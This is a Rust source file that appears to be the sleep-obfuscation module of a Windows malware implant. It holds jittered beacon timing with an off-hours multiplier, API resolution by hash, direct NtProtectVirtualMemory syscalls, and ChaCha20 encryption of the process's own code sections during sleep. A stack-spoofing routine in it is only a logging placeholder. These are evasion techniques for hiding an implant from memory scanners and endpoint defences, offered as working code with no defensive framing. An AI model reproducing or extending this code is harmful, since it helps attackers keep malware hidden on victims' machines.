use anyhow::Result;
use common::config::{self, SleepMethod, SleepConfig};
use log::{info, debug};
use rand::{thread_rng, Rng, RngCore};
use std::sync::atomic::{AtomicUsize, Ordering};

pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
    let mut base = config.base_interval_secs as f64;
    if let (Some(start), Some(end), Some(mult)) = (config.working_hours_start, config.working_hours_end, config.off_hours_multiplier) {
        let now = (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() / 3600 % 24) as u32;
        if now < start || now >= end {
            base *= mult as f64;
            debug!("Applying off-hours sleep multiplier: {}", mult);
        }
    }
    let mut rng = thread_rng();
    let jitter_frac = (config.jitter_percent as f64) / 100.0;
    let jitter_val = base * jitter_frac;
    let offset = rng.gen_range(-jitter_val..=jitter_val);
    std::time::Duration::from_secs_f64((base + offset).max(1.0))
}

#[cfg(windows)]
pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Result<()> {
    match method {
        SleepMethod::Ekko | SleepMethod::Foliage => {
            info!("Initiating Foliage-style sleep for {:?}", duration);
            #[cfg(target_arch = "x86_64")]
            unsafe {
                use winapi::um::synchapi::WaitForSingleObject;
                use winapi::shared::ntdef::{NTSTATUS, LARGE_INTEGER};
                use std::ffi::c_void;
                
                // Foliage uses NtDelayExecution
                
                crypto::encrypt_sections();
                spoof::spoof_stack();

                let duration_100ns = -(duration.as_nanos() as i64 / 100);
                let delay = duration_100ns;
                
                let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(&"ntdll.dll\0".encode_utf16().collect::<Vec<u16>>()));
                let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(ntdll.unwrap_or(0), pe_resolve::hash_str(b"NtDelayExecution\0")).unwrap_or(0);
                let addr = nt_delay_execution_addr as *const ();
                if !addr.is_null() {
                    let function: extern "system" fn(u8, *const i64) -> i32 = std::mem::transmute(addr);
                    function(0, &delay);
                }

                spoof::restore_stack();
                crypto::decrypt_sections();
            }
            #[cfg(not(target_arch = "x86_64"))]
            std::thread::sleep(duration);
            Ok(())
        }
        _ => {
            info!("Standard sleep for {:?}", duration);
            std::thread::sleep(duration);
            Ok(())
        }
    }
}

pub mod crypto {
    use rand::RngCore;
    #[cfg(windows)]
    use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};

    thread_local! {
        static SESSION_KEY: std::cell::RefCell<[u8; 32]> = std::cell::RefCell::new([0; 32]);
    }

    #[cfg(windows)]
    unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
        use winapi::um::libloaderapi::GetModuleHandleA;
        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
        
        let mut sections = Vec::new();
        let base = GetModuleHandleA(std::ptr::null_mut());
        if base.is_null() { return sections; }
        
        let dos = base as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return sections; }
        
        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt).Signature != IMAGE_NT_SIGNATURE { return sections; }
        
        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        for _ in 0..(*nt).FileHeader.NumberOfSections {
            let name = (*section).Name;
            if name[0..5] == [b'.', b't', b'e', b'x', b't'] || name[0..6] == [b'.', b'r', b'd', b'a', b't', b'a'] {
                let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
                let size = *(*section).Misc.VirtualSize() as usize;
                sections.push((addr, size));
            }
            section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
        }
        sections
    }

    #[cfg(not(windows))]
    unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> { Vec::new() }

    #[cfg(windows)]
    pub fn encrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::guard_memory();
            return;
        }

        unsafe {
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            SESSION_KEY.with(|k| { *k.borrow_mut() = key; });

            let nonce = [0u8; 12];
            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());

            // Zero local key variable
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);

            for (addr, mut size) in get_code_sections() {
                let mut old_protect = 0u32;
                let mut base_addr = addr as *mut winapi::ctypes::c_void;

                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    winapi::um::winnt::PAGE_READWRITE as u64,
                    &mut old_protect as *mut _ as usize as u64
                );
                
                let slice = std::slice::from_raw_parts_mut(addr, size);
                cipher.apply_keystream(slice);
                
                let mut temp = 0u32;
                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    old_protect as u64,
                    &mut temp as *mut _ as usize as u64
                );
            }
        }
    }

    #[cfg(windows)]
    pub fn decrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::unguard_memory();
            return;
        }

        unsafe {
            let mut key = [0u8; 32];
            SESSION_KEY.with(|k| { key = *k.borrow(); });

            let nonce = [0u8; 12];
            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
            
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);

            for (addr, mut size) in get_code_sections() {
                let mut old_protect = 0u32;
                let mut base_addr = addr as *mut winapi::ctypes::c_void;

                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    winapi::um::winnt::PAGE_READWRITE as u64,
                    &mut old_protect as *mut _ as usize as u64
                );
                
                let slice = std::slice::from_raw_parts_mut(addr, size);
                cipher.apply_keystream(slice);
                
                let mut temp = 0u32;
                let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    old_protect as u64,
                    &mut temp as *mut _ as usize as u64
                );
            }
        }
    }

    #[cfg(not(windows))]
    pub fn encrypt_sections() {}
    #[cfg(not(windows))]
    pub fn decrypt_sections() {}
}

pub mod spoof {
    thread_local! {
        static SAVED_RSP: std::cell::RefCell<usize> = std::cell::RefCell::new(0);
        static SAVED_RET: std::cell::RefCell<usize> = std::cell::RefCell::new(0);
    }
    
    #[cfg(windows)]
    pub fn spoof_stack() { 
        unsafe {
            let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(&"kernel32.dll\0".encode_utf16().collect::<Vec<u16>>()));
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(&"ntdll.dll\0".encode_utf16().collect::<Vec<u16>>()));
            
            // This is a minimal placeholder for the ROP-based stack spoofer
            log::debug!("Spoofing SLEEP stack frames (simulated 3-5 frames)"); 
        }
    }
    
    #[cfg(windows)]
    pub fn restore_stack() { log::debug!("Restoring stack frames"); }

    #[cfg(not(windows))]
    pub fn spoof_stack() {}
    
    #[cfg(not(windows))]
    pub fn restore_stack() {}
}
